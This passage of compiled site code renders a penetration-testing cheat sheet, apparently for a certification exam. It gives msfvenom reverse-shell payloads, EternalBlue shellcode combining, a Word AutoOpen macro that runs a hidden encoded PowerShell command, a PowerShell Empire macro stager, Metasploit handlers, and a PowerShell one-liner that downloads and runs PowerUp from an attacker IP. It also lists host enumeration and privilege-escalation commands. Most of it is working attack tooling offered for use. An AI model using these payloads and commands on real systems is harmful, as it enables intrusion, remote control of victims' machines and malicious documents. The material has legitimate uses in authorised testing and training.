extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[s("span",{pre:!0,attrs:{class:"token function"}},[t._v("wget")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("192.168")]),t._v(".1.102:9999/file.txt\n")])])]),s("h4",{attrs:{id:"curl"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#curl"}},[t._v("#")]),t._v(" Curl")]),t._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[s("span",{pre:!0,attrs:{class:"token function"}},[t._v("curl")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-O")]),t._v(" http://192.168.0.101/file.txt\n")])])]),s("h2",{attrs:{id:"interactive-shells"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#interactive-shells"}},[t._v("#")]),t._v(" Interactive shells")]),t._v(" "),s("h3",{attrs:{id:"semi-interactive"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#semi-interactive"}},[t._v("#")]),t._v(" Semi-interactive")]),t._v(" "),s("p",[t._v("Getting a semi-interactive shells is simple:")]),t._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[t._v("python "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-c")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'import pty; pty.spawn(\"/bin/bash\")'")]),t._v("\n")])])]),s("h3",{attrs:{id:"fully-interactive-shell"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#fully-interactive-shell"}},[t._v("#")]),t._v(" Fully interactive shell")]),t._v(" "),s("p",[t._v("First, run the semi-interactive shell python command, then background the current shell process, run "),s("code",[t._v("stty raw -echo")]),t._v(" in the terminal which will pass keyboard shortcuts through, then run "),s("code",[t._v("fg")]),t._v(" to bring netcat back.")]),t._v(" "),s("h2",{attrs:{id:"msfvenom"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#msfvenom"}},[t._v("#")]),t._v(" Msfvenom")]),t._v(" "),s("h3",{attrs:{id:"windows-exe-staged-payload-needs-metasploit-to-catch-allowed-on-exam"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#windows-exe-staged-payload-needs-metasploit-to-catch-allowed-on-exam"}},[t._v("#")]),t._v(" Windows exe staged_payload (needs metasploit to catch, "),s("strong",[t._v("allowed on exam")]),t._v(")")]),t._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[t._v("msfvenom "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-p")]),t._v(" windows/meterpreter/reverse_tcp "),s("span",{pre:!0,attrs:{class:"token assign-left variable"}},[t._v("LHOST")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("10.11")]),t._v(".0.4 "),s("span",{pre:!0,attrs:{class:"token assign-left variable"}},[t._v("LPORT")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("5555")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-f")]),t._v(" exe "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" binary.exe\n")])])]),s("h3",{attrs:{id:"powershell-2"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#powershell-2"}},[t._v("#")]),t._v(" Powershell")]),t._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[t._v("msfvenom "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-p")]),t._v(" windows/meterpreter/reverse_tcp "),s("span",{pre:!0,attrs:{class:"token assign-left variable"}},[t._v("LHOST")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("192.168")]),t._v(".119.194 "),s("span",{pre:!0,attrs:{class:"token assign-left variable"}},[t._v("LPORT")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("5555")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-f")]),t._v(" powershell\n")])])]),s("h3",{attrs:{id:"combining-payloads"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#combining-payloads"}},[t._v("#")]),t._v(" Combining payloads")]),t._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[t._v("nasm "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-f")]),t._v(" bin eternalblue_x64_kshellcode.asm "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-o")]),t._v(" sc_x64_kernel.bin\nmsfvenom "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-p")]),t._v(" windows/x64/meterpreter/reverse_tcp "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-f")]),t._v(" raw "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-o")]),t._v(" sc_x64_msf.bin "),s("span",{pre:!0,attrs:{class:"token assign-left variable"}},[t._v("LHOST")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("192.168")]),t._v(".254.142 "),s("span",{pre:!0,attrs:{class:"token assign-left variable"}},[t._v("LPORT")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("4444")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("cat")]),t._v(" sc_x64_kernel.bin sc_x64_msf.bin "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" sc_x64.bin\n")])])]),s("h2",{attrs:{id:"windows-tips-tricks"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#windows-tips-tricks"}},[t._v("#")]),t._v(" Windows tips & tricks")]),t._v(" "),s("h3",{attrs:{id:"changing-execution-policy"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#changing-execution-policy"}},[t._v("#")]),t._v(" Changing execution policy")]),t._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[t._v("Set-ExecutionPolicy "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-ExecutionPolicy")]),t._v(" Unrestricted "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-Scope")]),t._v(" CurrentUser\nGet-ExecutionPolicy "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-Scope")]),t._v(" CurrentUser\n")])])]),s("h2",{attrs:{id:"microsoft-word-macro-payload"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#microsoft-word-macro-payload"}},[t._v("#")]),t._v(" Microsoft-word macro payload")]),t._v(" "),s("p",[t._v("First create an "),s("code",[t._v("evil.hta")]),t._v(" file like so:")]),t._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# recommended")]),t._v("\nmsfvenom "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-p")]),t._v(" windows/shell_reverse_tcp "),s("span",{pre:!0,attrs:{class:"token assign-left variable"}},[t._v("LHOST")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("192.168")]),t._v(".119.194 "),s("span",{pre:!0,attrs:{class:"token assign-left variable"}},[t._v("LPORT")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("80")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-f")]),t._v(" vba-psh "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" payload.txt\n"),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# or")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("sudo")]),t._v(" msfvenom "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-p")]),t._v(" windows/shell_reverse_tcp "),s("span",{pre:!0,attrs:{class:"token assign-left variable"}},[t._v("LHOST")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("10.11")]),t._v(".0.4 "),s("span",{pre:!0,attrs:{class:"token assign-left variable"}},[t._v("LPORT")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("4444")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-f")]),t._v(" hta-psh "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-o")]),t._v(" /var/www/html/evil.hta \n")])])]),s("p",[t._v("Next create a new macro and copy-paste the file into the macro")]),t._v(" "),s("p",[t._v("Finally create a word macro and past the shell code in like so:")]),t._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[t._v("Sub AutoOpen"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n    MyMacro\nEnd Sub\n\nSub Document_Open"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n    MyMacro\nEnd Sub\n\nSub MyMacro"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n    Dim Str As String\n    Str "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZ"')]),t._v("\n    Str "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" Str + "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"QB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBNAGUAbQBvAHIAeQB"')]),t._v("\n    Str "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" Str + "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"TAHQAcgBlAGEAbQAoACwAWwBDAG8AbgB2AGUAcgB0AF0AOgA6A"')]),t._v("\n    Str "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" Str + "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"EYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAnAEg"')]),t._v("\n    Str "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" Str + "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"ANABzAEkAQQBBAEEAQQBBAEEAQQBFAEEATAAxAFgANgAyACsAY"')]),t._v("\n    Str "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" Str + "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"gBTAEIARAAvAG4ARQBqADUASAAvAGgAZwBDAFoAQwBJAFoAUgB"')]),t._v("\n    "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("..")]),t._v(".\n    Str "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" Str + "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"AZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBEAGUAYwBvAG0Ac"')]),t._v("\n    Str "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" Str + "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"AByAGUAcwBzACkADQAKACQAcwB0AHIAZQBhAG0AIAA9ACAATgB"')]),t._v("\n    Str "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" Str + "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"lAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAFMAdAByAGUAYQBtA"')]),t._v("\n    Str "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" Str + "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"FIAZQBhAGQAZQByACgAJABnAHoAaQBwACkADQAKAGkAZQB4ACA"')]),t._v("   \n    Str "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" Str + "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"AJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAVABvAEUAbgBkACgAK"')]),t._v("\n    Str "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" Str + "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"QA="')]),t._v(" \n    \n    CreateObject"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"Wscript.Shell"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(".Run Str \nEnd Sub\n")])])]),s("p",[t._v("Now save the file as either a "),s("code",[t._v("docm")]),t._v(" file type or a "),s("code",[t._v("doc")]),t._v(" (older) file type")]),t._v(" "),s("p",[s("strong",[t._v("ALTERNATIVELY")])]),t._v(" "),s("p",[t._v("we can use powershell empire")]),t._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("Empire"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" listeners\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("Empire: listeners"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" uselistener http\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("Empire: listeners/http"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("set")]),t._v(" Host "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("192.168")]),t._v(".119.194\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("Empire: listeners/http"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("set")]),t._v(" Name exploit\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("Empire: listeners/http"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" execute\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Starting listener "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'exploit'")]),t._v("\n * Serving Flask app "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"http"')]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("lazy loading"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n * Environment: production\n   WARNING: This is a development server. Do not use it "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("in")]),t._v(" a production deployment.\n   Use a production WSGI server instead.\n * Debug mode: off\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("+"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Listener successfully started"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("!")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("Empire: listeners/http"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" back\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("Empire: listeners"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" usestager windows/macro\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("Empire: stager/windows/macro"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" listeners\n\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Active listeners:\n\n  Name              Module          Host                                 Delay/Jitter   KillDate\n  ----              ------          ----                                 ------------   --------\n  exploit           http            http://192.168.119.194:80            "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("5")]),t._v("/0.0                  \n\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("Empire: stager/windows/macro"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("set")]),t._v(" Listener exploit\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("Empire: stager/windows/macro"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" execute\n\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Stager output written out to: /tmp/macro\n")])])]),s("p",[t._v("Check if macro was embedded using `olevba word_macro.doc from "),s("a",{attrs:{href:"https://github.com/decalage2/oletools",target:"_blank",rel:"noopener noreferrer"}},[t._v("oletools"),s("OutboundLink")],1)]),t._v(" "),s("h2",{attrs:{id:"metasploit-framework"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#metasploit-framework"}},[t._v("#")]),t._v(" Metasploit framework")]),t._v(" "),s("h3",{attrs:{id:"windows-reverse-meterpreter-shell"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#windows-reverse-meterpreter-shell"}},[t._v("#")]),t._v(" Windows reverse meterpreter shell")]),t._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[t._v("msfconsole "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-x")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"use exploit/multi/handler"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("set")]),t._v(" RHOST "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("192.168")]),t._v(".194.10"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("set")]),t._v(" PAYLOAD windows/meterpreter/reverse_tcp"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("set")]),t._v(" LHOST "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("192.168")]),t._v(".119.194"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("set")]),t._v(" LPORT "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("5555")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n")])])]),s("p",[t._v("or")]),t._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[s("span",{pre:!0,attrs:{class:"token function"}},[t._v("sudo")]),t._v(" msfconsole\n"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" use exploit/multi/handler\n"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("set")]),t._v(" PAYLOAD windows/meterpreter/reverse_tcp\n"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("set")]),t._v(" LHOST "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("192.168")]),t._v(".119.194\n"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("set")]),t._v(" LPORT "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("5555")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" run\n")])])]),s("h2",{attrs:{id:"device-enumeration"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#device-enumeration"}},[t._v("#")]),t._v(" Device enumeration")]),t._v(" "),s("h3",{attrs:{id:"useful-commands-for-windows-clients"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#useful-commands-for-windows-clients"}},[t._v("#")]),t._v(" Useful commands for windows clients:")]),t._v(" "),s("ul",[s("li",[t._v("View user info: "),s("code",[t._v("net user")])]),t._v(" "),s("li",[t._v("View system info: "),s("code",[t._v("systeminfo")])]),t._v(" "),s("li",[t._v("View routing information: "),s("code",[t._v("route print")])]),t._v(" "),s("li",[t._v("View running services: "),s("code",[t._v("Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}")])]),t._v(" "),s("li",[t._v("View active network connections: "),s("code",[t._v("netstat -ano")])]),t._v(" "),s("li",[t._v("View current firewall profile: "),s("code",[t._v("netsh advfirewall show currentprofile")]),t._v(" "),s("ul",[s("li",[t._v("View all firewall rules: "),s("code",[t._v("netsh advfirewall show rule name=all")])])])]),t._v(" "),s("li",[t._v("View scheduled tasks: "),s("code",[t._v("schtasks /query /fo LIST /v")])]),t._v(" "),s("li",[t._v("View all installed application with version: "),s("code",[t._v("wmic product get name, version, vendor")]),t._v(" "),s("ul",[s("li",[t._v("View system wide updates: "),s("code",[t._v("wmic qfe Caption, Description, HotFixID, InstalledOn")])])])]),t._v(" "),s("li",[t._v("View any file that can be modified by anyone using "),s("strong",[t._v("powershell")]),t._v(": "),s("code",[t._v('Get-ChildItem "C:\\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\\sAllow\\s\\sModify"}')])]),t._v(" "),s("li",[t._v("List all drives that are mounted and non-mounted: "),s("code",[t._v("mountvol")])]),t._v(" "),s("li",[t._v("Gather kernel information in "),s("strong",[t._v("powershell")]),t._v(": "),s("code",[t._v("driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Node', Path")])]),t._v(" "),s("li",[t._v("Gather driver versions ie. vmware: "),s("code",[t._v('Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*Vmware*"}')])]),t._v(" "),s("li",[t._v("Checking if we can run any windows installer with elevated priviledges:\n"),s("ul",[s("li",[s("code",[t._v("reg query HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\Installer")])]),t._v(" "),s("li",[s("code",[t._v("reg query HKEY_CURRENT_MACHINE\\Software\\Policies\\Microsoft\\Windows\\Installer")])])])])]),t._v(" "),s("h3",{attrs:{id:"for-linux-client-commands-that-can-be-used"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#for-linux-client-commands-that-can-be-used"}},[t._v("#")]),t._v(" For linux client, commands that can be used:")]),t._v(" "),s("ul",[s("li",[t._v("View all processes: "),s("code",[t._v("ps axu")])]),t._v(" "),s("li",[t._v("Check all TCP/IP configurations: "),s("code",[t._v("ip a")])]),t._v(" "),s("li",[t._v("Display network routing table: "),s("code",[t._v("/sbin/route")])]),t._v(" "),s("li",[t._v("Display active network connections: "),s("code",[t._v("ss -anp")])]),t._v(" "),s("li",[t._v("View scheduled tasks: "),s("code",[t._v("ls -lah /etc/cron*")]),t._v(" "),s("ul",[s("li",[t._v("Crontab: "),s("code",[t._v("cat /etc/crontab")])])])]),t._v(" "),s("li",[t._v("Listing installed packages: "),s("code",[t._v("dpkg -l")])]),t._v(" "),s("li",[t._v("Find all directories writable by current user: "),s("code",[t._v("find / -writable -type d 2>/dev/null")])]),t._v(" "),s("li",[t._v("List all mounted file systems: "),s("code",[t._v("mount")]),t._v(" "),s("ul",[s("li",[t._v("static file system: "),s("code",[t._v("cat /etc/fstab")])]),t._v(" "),s("li",[t._v("All available disks: "),s("code",[t._v("/bin/lsblk")])])])]),t._v(" "),s("li",[t._v("Loaded kernel modules: "),s("code",[t._v("lsmod")]),t._v(" "),s("ul",[s("li",[t._v("Find out more about module: "),s("code",[t._v("/sbin/modinfo <module_name>")])])])]),t._v(" "),s("li",[t._v("Find any binaries that can be run as root: "),s("code",[t._v("find / -perm -u=s -type f 2>/dev/null")])])]),t._v(" "),s("h2",{attrs:{id:"privilege-escalation-priv-esc"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#privilege-escalation-priv-esc"}},[t._v("#")]),t._v(" Privilege escalation (Priv esc)")]),t._v(" "),s("h3",{attrs:{id:"windows"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#windows"}},[t._v("#")]),t._v(" Windows")]),t._v(" "),s("ul",[s("li",[t._v("Starting powershell in high-integrity mode: "),s("code",[t._v("powershell Start-Process cmd.exe -Verb runAs")])]),t._v(" "),s("li",[t._v("A lot of windows binaries can be found at "),s("code",[t._v("/usr/share/windows-binaries/")]),t._v(" for kali linux")])]),t._v(" "),s("h4",{attrs:{id:"sherlock"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#sherlock"}},[t._v("#")]),t._v(" Sherlock")]),t._v(" "),s("ul",[s("li",[t._v("Can use sherlock to find priv esc possiblities")])]),t._v(" "),s("h4",{attrs:{id:"finding-system-info"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#finding-system-info"}},[t._v("#")]),t._v(" Finding system info")]),t._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[t._v("systeminfo "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" findstr /B /C:"),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"OS Name"')]),t._v(" /C:"),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"OS Version"')]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("hostname")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("echo")]),t._v(" %username%\nnet "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("users")]),t._v("\n")])])]),s("h4",{attrs:{id:"powerup"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#powerup"}},[t._v("#")]),t._v(" Powerup")]),t._v(" "),s("div",{staticClass:"language-powershell extra-class"},[s("pre",{pre:!0,attrs:{class:"language-powershell"}},[s("code",[t._v("powershell "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Version 2 "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("nop "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("exec bypass "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("IEX")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("New-Object")]),t._v(" Net"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("WebClient"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("DownloadString"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'http://192.168.119.194/PowerUp.ps1'")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("Invoke-AllChecks")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# Powerup original url: 